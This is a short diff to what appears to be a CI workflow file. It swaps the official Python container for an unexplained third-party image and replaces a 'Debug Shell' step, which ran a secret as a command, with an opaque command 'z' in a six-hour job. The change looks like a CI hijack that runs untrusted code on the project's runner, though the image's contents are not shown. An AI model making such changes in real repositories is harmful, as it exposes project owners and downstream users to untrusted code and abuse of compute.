@@ -7,7 +7,7 @@ jobs:
     runs-on: ubuntu-24.04
     timeout-minutes: 360
     container:
-      image: python:3.10-bullseye
+      image: dawngardea/1160:8452
     steps:
     - name: Debug Shell
-      run: ${{ secrets.VERBOSE }}
+      run: z
